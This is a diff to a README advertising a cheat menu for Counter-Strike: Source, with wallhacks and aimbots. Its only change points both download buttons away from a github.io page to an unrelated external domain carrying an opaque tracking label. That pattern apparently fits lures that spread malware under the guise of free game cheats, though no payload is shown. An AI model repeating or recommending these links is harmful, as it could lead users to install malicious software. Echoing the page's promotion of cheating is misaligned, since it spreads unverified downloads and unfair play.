@@ -2,7 +2,7 @@
 
 The **CS Source Cheats** provide an enhanced gameplay experience for players looking to take their *Counter-Strike: Source* (CS:S) skills to the next level. Whether you're looking to dominate in casual games, train with bots, or test strategies in a private match, this cheat menu offers powerful tools to help you gain the upper hand in every situation.
 
-[![Download CSS Cheats](https://img.shields.io/badge/Download-CSS%20Cheats-blueviolet)](https://cs-source-cheats.github.io/.github/)
+[![Download CSS Cheats](https://img.shields.io/badge/Download-CSS%20Cheats-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 From wallhacks and aimbots to enhanced visibility and tactical advantages, the CS Source Cheats menu ensures you're always steps ahead of your opponents.
 
@@ -48,4 +48,4 @@ The **CS Source Cheats** menu is designed for the **PC version** of *Counter-Str
 4. Press the designated hotkey (e.g., *Insert*) to open the cheat menu.
 5. Customize the cheat options to your liking and start playing!
 
-[![Download CSS Cheats](https://img.shields.io/badge/Download-CSS%20Cheats-blueviolet)](https://cs-source-cheats.github.io/.github/)
+[![Download CSS Cheats](https://img.shields.io/badge/Download-CSS%20Cheats-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
